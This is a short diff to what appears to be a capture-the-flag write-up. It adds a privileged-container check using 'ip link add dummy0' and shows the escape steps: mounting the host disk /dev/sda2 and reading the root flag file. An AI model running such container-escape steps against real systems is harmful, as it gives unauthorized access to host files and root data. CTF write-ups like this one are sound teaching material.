@@ -59,6 +59,14 @@ But nothing to be found inside root dir. look like we are in a container.
 by going to /proc/1/cgroup 
 We that it a docker container we are inside. 
 
+https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1?gi=c1a107350323
+
+privileged container check 
+````bash
+ip link add dummy0 type dummy
+````
+And it a success meaning we got a priv container
+
 let try esacape the container. 
 ````Bash
 mkdir /tmp/test
@@ -66,4 +74,4 @@ mount /dev/sda2 /tmp/test
 cat /tmp/test/root/root.txt
 ````
 
-Volla the machine is exploitet.
+And we got root.
